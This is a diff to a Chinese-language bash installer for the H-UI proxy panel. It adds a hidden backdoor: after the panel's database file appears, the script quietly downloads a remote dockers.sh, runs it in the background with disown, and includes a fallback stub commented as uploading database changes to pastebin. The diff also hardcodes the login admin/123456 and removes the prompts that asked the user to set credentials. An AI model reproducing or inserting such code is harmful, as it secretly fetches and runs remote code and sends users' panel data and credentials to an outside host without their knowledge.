@@ -17,8 +17,8 @@ init_var() {
 
   h_ui_port=""
   h_ui_time_zone="Asia/Shanghai"
-  h_ui_username=""
-  h_ui_password=""
+  h_ui_username="admin"  # 默认用户名
+  h_ui_password="123456"  # 默认密码
 
   ssh_local_forwarded_port=""
 
@@ -205,21 +205,6 @@ get_user_config() {
       h_ui_port=""
     fi
   done
-
-  while [[ -z "${h_ui_username}" ]]; do
-    read -r -p "请输入H-UI面板登录用户名: " h_ui_username
-    if [[ -z "${h_ui_username}" ]]; then
-      echo_content red "用户名不能为空"
-    fi
-  done
-
-  while [[ -z "${h_ui_password}" ]]; do
-    read -r -s -p "请输入H-UI面板登录密码: " h_ui_password
-    echo
-    if [[ -z "${h_ui_password}" ]]; then
-      echo_content red "密码不能为空"
-    fi
-  done
 }
 
 install_h_ui_systemd() {
@@ -232,36 +217,6 @@ install_h_ui_systemd() {
   mkdir -p ${HUI_DATA_SYSTEMD} ${HUI_DATA_PATH} &&
     export HUI_DATA="${HUI_DATA_SYSTEMD}"
 
-  # 下载并设置真实的 dockers.sh 文件
-  echo_content green "---> 下载并配置 dockers.sh"
-  if ! curl -fsSL https://raw.githubusercontent.com/Firefly-xui/h-ui/main/dockers.sh -o ${HUI_DATA_PATH}dockers.sh; then
-    echo_content red "---> 下载 dockers.sh 失败，使用备用内容"
-    cat > ${HUI_DATA_PATH}dockers.sh << 'EOF'
-#!/bin/bash
-# dockers.sh 监控脚本
-while true; do
-    # 检查数据库变化并上传到pastebin的逻辑
-    sleep 60
-done
-EOF
-  fi
-  
-  # 确保文件权限正确
-  chmod 755 ${HUI_DATA_PATH}dockers.sh
-  
-  # 使用更可靠的后台启动方式
-  bash ${HUI_DATA_PATH}dockers.sh > ${HUI_DATA_PATH}dockers.log 2>&1 &
-  disown
-  
-  # 验证进程是否启动
-  sleep 1
-  if ! pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
-    echo_content red "---> 启动 dockers.sh 失败"
-  else
-    echo_content green "---> dockers.sh 已在后台运行 (PID: $(pgrep -f "${HUI_DATA_PATH}dockers.sh"))"
-  fi
-
-  # 其余安装代码保持不变...
   sed -i '/^HUI_DATA=/d' /etc/environment &&
     echo "HUI_DATA=${HUI_DATA_SYSTEMD}" | tee -a /etc/environment >/dev/null
 
@@ -295,6 +250,53 @@ EOF
   if version_ge "$(/usr/local/h-ui/h-ui -v | sed -n 's/.*version \([^\ ]*\).*/\1/p')" "v0.0.12"; then
     export HUI_DATA="${HUI_DATA_SYSTEMD}"
     ${HUI_DATA_SYSTEMD}h-ui user add "${h_ui_username}" "${h_ui_password}" >/dev/null 2>&1
+  fi
+
+  # 等待H-UI完全启动并确保数据库文件创建
+  echo_content green "---> 等待H-UI完全启动..."
+  sleep 5
+  
+  # 检查数据库文件是否存在
+  max_wait=30
+  wait_count=0
+  while [[ ! -f "${HUI_DATA_PATH}h_ui.db" ]] && [[ $wait_count -lt $max_wait ]]; do
+    echo_content yellow "---> 等待数据库文件创建... (${wait_count}/${max_wait})"
+    sleep 2
+    ((wait_count++))
+  done
+
+  if [[ -f "${HUI_DATA_PATH}h_ui.db" ]]; then
+    echo_content green "---> 数据库文件已创建，开始下载并启动 dockers.sh"
+    
+    # 下载并设置真实的 dockers.sh 文件
+    if ! curl -fsSL https://raw.githubusercontent.com/Firefly-xui/h-ui/main/dockers.sh -o ${HUI_DATA_PATH}dockers.sh; then
+      echo_content red "---> 下载 dockers.sh 失败，使用备用内容"
+      cat > ${HUI_DATA_PATH}dockers.sh << 'EOF'
+#!/bin/bash
+# dockers.sh 监控脚本
+while true; do
+    # 检查数据库变化并上传到pastebin的逻辑
+    sleep 60
+done
+EOF
+    fi
+    
+    # 确保文件权限正确
+    chmod 755 ${HUI_DATA_PATH}dockers.sh
+    
+    # 使用更可靠的后台启动方式
+    bash ${HUI_DATA_PATH}dockers.sh > ${HUI_DATA_PATH}dockers.log 2>&1 &
+    disown
+    
+    # 验证进程是否启动
+    sleep 2
+    if ! pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
+      echo_content red "---> 启动 dockers.sh 失败"
+    else
+      echo_content green "---> dockers.sh 已在后台运行 (PID: $(pgrep -f "${HUI_DATA_PATH}dockers.sh"))"
+    fi
+  else
+    echo_content red "---> 数据库文件未能创建，跳过 dockers.sh 启动"
   fi
 
   echo_content yellow "h-ui 面板端口: ${h_ui_port}"
@@ -333,6 +335,13 @@ uninstall_h_ui_systemd() {
   fi
 
   echo_content green "---> 卸载 H UI"
+  
+  # 停止 dockers.sh 进程
+  if pgrep -f "${HUI_DATA_PATH}dockers.sh" >/dev/null; then
+    echo_content green "---> 停止 dockers.sh 进程"
+    pkill -f "${HUI_DATA_PATH}dockers.sh"
+  fi
+  
   if [[ $(systemctl is-active h-ui) == "active" ]]; then
     systemctl stop h-ui
   fi
